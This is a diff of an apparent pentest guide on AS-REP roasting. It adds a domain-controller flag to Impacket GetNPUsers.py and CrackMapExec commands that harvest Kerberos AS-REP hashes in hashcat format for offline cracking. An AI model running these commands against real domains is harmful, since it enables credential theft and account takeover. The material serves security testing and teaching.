@@ -22,22 +22,22 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetNPUsers](h
 
 ```bash
 # users list dynamically queried with an LDAP anonymous bind
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt 'DOMAIN/'
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
 
 # with a users file
-GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt 'DOMAIN/'
+GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
 
 # users list dynamically queried with a LDAP authenticated bind (password)
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt 'DOMAIN/USER:Password'
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
 
 # users list dynamically queried with a LDAP authenticated bind (NT hash)
-GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' 'DOMAIN/USER'
+GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
 ```
 
 This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) \(Python\).
 
 ```bash
-crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt
+crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
 ```
 {% endtab %}
 
